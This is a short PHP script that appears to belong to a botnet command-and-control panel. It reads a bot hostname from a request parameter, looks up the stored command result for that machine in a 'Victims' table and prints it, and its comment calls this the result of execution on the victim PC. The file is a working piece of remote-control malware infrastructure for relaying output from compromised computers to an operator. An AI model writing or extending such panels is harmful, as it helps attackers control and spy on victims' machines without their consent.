<?php
include 'session.php';
include 'conn.php';
//the result from the victim pc and its execution
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["bot"])) {
  $retrieveResult = $mysql->prepare("select commandresult from Victims where hostname=?");
  $retrieveResult->bind_param("s", $_GET["bot"]);
  $retrieveResult->execute();
  $retrieveResult->store_result();
  $retrieveResult->bind_result($commandresult);
  $retrieveResult->fetch();
  echo $commandresult;

}


?>